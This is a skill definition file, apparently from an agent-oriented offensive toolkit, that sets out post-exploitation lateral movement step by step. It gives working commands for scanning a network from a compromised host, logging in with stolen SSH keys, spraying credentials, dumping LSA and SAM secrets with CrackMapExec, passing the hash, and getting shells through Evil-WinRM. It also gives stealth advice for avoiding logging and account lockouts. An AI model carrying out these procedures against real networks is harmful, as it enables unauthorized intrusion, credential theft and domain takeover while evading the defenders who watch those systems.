---
name: lateral-movement
description: Move laterally across network using discovered credentials
version: 1.0.0
phase: post
category: post-exploitation
tags: [lateral-movement, pivot, ssh, windows, credentials]
tools: [ssh, crackmapexec, evil-winrm]
difficulty: intermediate
opsec_level: high
time_estimate: 5m
severity_if_found: high
related_skills:
  - credential-harvest
  - credential-dump-windows
  - credential-dump-linux
mitre_attack:
  - T1021
  - T1021.001
  - T1021.002
---

## When to Use

Use this skill after obtaining credentials (passwords, hashes, SSH keys) to
pivot to other hosts in the network. Map accessible systems and identify
additional high-value targets.

## Prerequisites

- Credentials from credential-harvest or credential-dump
- Network connectivity to target hosts
- ssh, crackmapexec, or evil-winrm installed

## Procedure

```bash
# 1. Discover network range from compromised host
ip a | grep inet | grep -v 127.0.0.1
ip route | head -5
cat /etc/resolv.conf

# 2. Scan for SSH hosts
nmap -p 22 --open 10.0.0.0/24 -oG - 2>/dev/null | grep "22/open"

# 3. SSH lateral movement (Linux)
ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 user@TARGET_IP "id && hostname"

# 4. Test stolen SSH keys
ssh -i /path/to/stolen_key -o StrictHostKeyChecking=no user@TARGET_IP

# 5. CrackMapExec — SMB enumeration and credential spray
crackmapexec smb 10.0.0.0/24 -u USERNAME -p PASSWORD --shares
crackmapexec smb 10.0.0.0/24 -u USERNAME -p PASSWORD --lsa
crackmapexec smb 10.0.0.0/24 -u USERNAME -H NTLM_HASH --sam

# 6. CrackMapExec — WinRM
crackmapexec winrm 10.0.0.0/24 -u USERNAME -p PASSWORD

# 7. Evil-WinRM (Windows remote management)
evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD
evil-winrm -i TARGET_IP -u USERNAME -H NTLM_HASH

# 8. Check for pass-the-hash
crackmapexec smb 10.0.0.0/24 -u administrator -H NTLM_HASH --local-auth

# 9. Enumerate accessible shares
crackmapexec smb 10.0.0.0/24 -u USERNAME -p PASSWORD --shares --sniff
```

## OPSEC Rules

- **HIGH RISK**: Lateral movement generates noisy authentication events
- Use stolen credentials sparingly — limit login attempts per host
- Prefer WinRM over SMB for stealth (less logging)
- Avoid account lockouts — max 3 attempts per account per host
- Document all pivots for rollback
- Do not persist sessions on pivoted hosts without authorization

## Verification

- Confirm successful authentication to new hosts
- Enumerate user privileges on pivoted systems
- Check for additional credential stores
- Map network topology from each pivot point

## Pitfalls

- Account lockout policies may trigger after failed attempts
- NTLMv2 hashes may not pass-the-hash on all systems
- Some hosts may require NLA (Network Level Authentication)
- Firewall rules may block SMB/WinRM between segments
- Credential Guard on Windows blocks mimikatz-style extraction

## Output Format

```
[PIVOT] Lateral movement successful
  From: compromised-host (10.0.1.5)
  To: web-server (10.0.1.10)
  Method: SSH with stolen key
  User: deploy
  Severity: HIGH

[SMB] Credential spray successful
  Host: 10.0.1.20 (DC01)
  User: backup-admin
  Access: Domain Admin group
  Severity: CRITICAL
```
